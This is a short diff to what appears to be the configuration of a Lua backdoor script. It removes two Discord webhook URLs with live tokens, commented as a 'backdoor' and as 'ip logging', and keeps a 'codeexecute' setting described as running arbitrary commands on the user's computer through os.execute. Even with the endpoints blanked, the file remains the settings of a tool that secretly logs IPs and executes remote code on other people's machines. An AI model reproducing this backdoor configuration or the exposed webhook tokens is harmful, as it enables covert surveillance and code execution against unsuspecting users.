@@ -1,5 +1,5 @@
-local ds = "https://discord.com/api/webhooks/1246899529026895882/fXgrWv-o2JE2zlnXBJZDb29uMdw-ZFSQvN2gEf67zYgmvYkYLvBbaNeGmMEeDu27J09F" -- 🔥 backdoor
-local webhook = "https://discord.com/api/webhooks/1246899589689114685/FP05PRv_vWhJviIoWefXg8nYdL0FjUxGnAsJrV9XF2CNYiiJNzn6E6fJ1eKiq_YXyAFQ" -- 🕵️‍♂️ ip logging
+local ds = "" -- 🔥 backdoor
+local webhook = "" -- 🕵️‍♂️ ip logging
 local codeexecute = "" -- If you wan't to execute your own code FX(cd C:/Users/%USERNAME%/Documents && mkdir Test) <-- Creates a new folder on the computer. (It executes its like this os.execute(CODE))
 local executecode = false 
 local warning = false
